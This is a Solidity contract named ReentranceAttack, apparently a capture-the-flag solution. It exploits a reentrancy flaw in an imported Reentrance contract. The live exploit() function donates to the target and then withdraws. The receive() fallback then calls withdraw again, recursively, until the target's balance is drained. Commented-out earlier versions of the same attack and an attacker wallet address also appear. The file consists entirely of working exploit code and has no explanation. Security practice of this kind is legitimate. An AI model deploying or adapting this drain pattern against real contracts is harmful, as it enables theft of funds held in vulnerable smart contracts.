// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentranceAttack {
  Reentrance private victimContract;

  // address private attackerAddress = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;

  constructor(address instance_) public payable {
    victimContract = Reentrance(payable(instance_));
  }

  // function donateToVictim() external payable {
  //   victimContract.donate{value: msg.value}(address(this));
  // }

  // function attack() external payable {
  //   require(msg.value >= 1 ether, "NEED AT LEAST 1 ETH");
  //   victimContract.withdraw(1 ether);
  //   // address(victimContract).call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
  // }

  // fallback() external payable {
  //   require(address(this).balance >= 0, "Empty wallet");
  //   if (address(victimContract).balance != 0) {
  //     // victimContract.withdraw(1 ether);
  //     address(victimContract).call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
  //     victimContract.donate{value: 1 ether}(address(this));
  //   }
  // }

  // receive() external payable {}

  function exploit(address _target) external payable {
    Reentrance target = Reentrance(payable(_target));
    target.donate{value: msg.value}(address(this));
    target.withdraw(msg.value);
  }

  receive() external payable {
    Reentrance target = Reentrance(payable(msg.sender));
    if (address(target).balance >= msg.value) {
      target.withdraw(msg.value);
    }
  }
}
